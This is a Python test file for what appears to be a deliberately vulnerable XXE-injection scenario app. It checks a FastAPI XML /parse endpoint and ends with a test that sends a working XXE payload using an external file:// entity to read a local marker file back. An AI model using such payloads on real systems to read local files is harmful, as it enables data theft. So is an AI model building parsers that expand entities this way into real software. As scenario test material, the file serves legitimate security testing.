"""Tests for S03 XXE injection scenario.

Uses in-process ASGI transport so tests don't need a running uvicorn.
"""

import os

from fastapi.testclient import TestClient

from main import app

client = TestClient(app)


def test_health():
    r = client.get("/health")
    assert r.status_code == 200
    assert r.json()["status"] == "ok"


def test_parse_normal_xml():
    xml = b"<root><name>test</name></root>"
    r = client.post("/parse", content=xml)
    assert r.status_code == 200
    data = r.json()
    assert "parsed" in data
    assert "test" in data["parsed"]


def test_parse_empty():
    r = client.post("/parse", content=b"")
    assert r.status_code == 200
    assert "error" in r.json()


def test_parse_invalid_xml():
    r = client.post("/parse", content=b"not xml at all")
    assert r.status_code == 200
    assert "error" in r.json()


def test_xxe_file_read():
    """XXE payload to read a local file — proves entity expansion."""
    marker_path = "/tmp/xxe_test_marker"
    with open(marker_path, "w") as f:
        f.write("xxe_proof")

    xml = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://{marker_path}">
]>
<root>&xxe;</root>""".encode()

    r = client.post("/parse", content=xml)
    assert r.status_code == 200
    data = r.json()
    assert "parsed" in data
    assert "xxe_proof" in data["parsed"]
    os.remove(marker_path)
